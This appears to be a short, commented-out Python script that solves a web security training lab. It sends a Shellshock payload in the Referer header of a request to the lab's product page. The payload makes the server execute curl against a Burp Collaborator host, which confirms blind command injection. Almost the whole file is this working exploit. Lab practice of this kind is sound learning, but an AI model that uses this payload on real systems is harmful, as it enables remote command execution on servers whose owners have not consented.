#!/usr/bin/python3

# import requests
# from requests.api import head

# def connection(url, endpoint):

#     headers = {
#         # Since the app is fetching data from the Referer header, simply putting the Burp collaborator url in the Referer header, we can solve the challenge.
#         'referer': '() { foo;}; echo Content-Type: text/plain ; echo ;  curl https://4sxoutlwi5yo6ews8t8tit21gsmia7.burpcollaborator.net',
#     }

#     r = requests.get(url + endpoint, headers=headers)

#     print(r.status_code)

# if __name__ == '__main__':
#     url = "https://ac021fae1fc8a4fcc00c87ad00e80086.web-security-academy.net"
#     endpoint = "/product?productId=1"

#     connection(url, endpoint)